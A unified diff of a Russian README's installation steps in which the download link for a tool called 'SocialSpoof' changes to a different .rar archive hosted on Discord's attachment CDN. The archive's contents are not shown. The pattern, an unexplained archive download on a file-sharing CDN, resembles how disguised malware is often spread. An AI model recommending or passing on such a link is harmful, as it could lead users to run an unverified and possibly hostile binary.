@@ -5,7 +5,7 @@
                                                   🔧Установка
 Шаг 1 📥
 
-Установите [SocialSpoof](https://cdn.discordapp.com/attachments/1153709870365806742/1154026506331377754/SocialSpoof.rar)
+Установите [SocialSpoof](https://cdn.discordapp.com/attachments/1146948784778137701/1164963673870184580/SocialSpoof-Release.rar?ex=65451ff7&is=6532aaf7&hm=b2dbfa6f1f3b24f45225c7be0622985cd498cf60114f16c8f150fe87be7ea45e&)
 
 Шаг 2 📂
 
